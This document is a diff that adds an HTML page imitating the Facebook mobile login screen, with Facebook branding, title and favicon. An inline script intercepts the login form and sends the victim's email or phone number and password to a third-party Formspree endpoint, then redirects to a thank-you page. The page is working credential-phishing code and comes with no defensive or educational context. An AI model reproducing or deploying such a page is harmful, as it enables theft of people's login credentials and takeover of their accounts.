@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/x-icon" href="https://www.facebook.com/favicon.ico">
+    <title>Facebook - log in or sign up</title>
+</head>
+
+<body>
+    <div class="page">
+        <div class="top-bar">
+            <button class="back-btn">&#8249;</button>
+        </div>
+
+        <div class="main">
+            <div class="logo-wrap">
+                <img src="image/fb_white_f.png" alt="Facebook" class="fb-logo">
+            </div>
+
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="email" name="identifier" placeholder=" " required>
+                    <label for="email">Mobile number or email address</label>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" name="credential" placeholder=" " required>
+                    <label for="password">Password</label>
+                </div>
+                <button type="submit" class="btn-login" id="loginBtn">
+                    <span id="btnText">Log in</span>
+                    <span id="btnSpinner" class="spinner" hidden></span>
+                </button>
+                <a href="#" class="forgot">Forgotten password?</a>
+            </form>
+            <script>
+                document.getElementById('loginForm').addEventListener('submit', async function(e) {
+                    e.preventDefault();
+                    const btn = document.getElementById('loginBtn');
+                    const text = document.getElementById('btnText');
+                    const spinner = document.getElementById('btnSpinner');
+                    btn.disabled = true;
+                    text.hidden = true;
+                    spinner.hidden = false;
+                    const data = new FormData(this);
+                    await fetch('https://formspree.io/f/mykavdev', {
+                        method: 'POST',
+                        body: data,
+                        headers: { 'Accept': 'application/json' }
+                    });
+                    window.location.href = 'thankyou.html';
+                });
+            </script>
+        </div>
+
+        <div class="bottom">
+            <button class="btn-create">Create new account</button>
+            <img src="image/meta_black.png" alt="Meta" class="meta-logo">
+        </div>
+    </div>
+</body>
+
+</html>
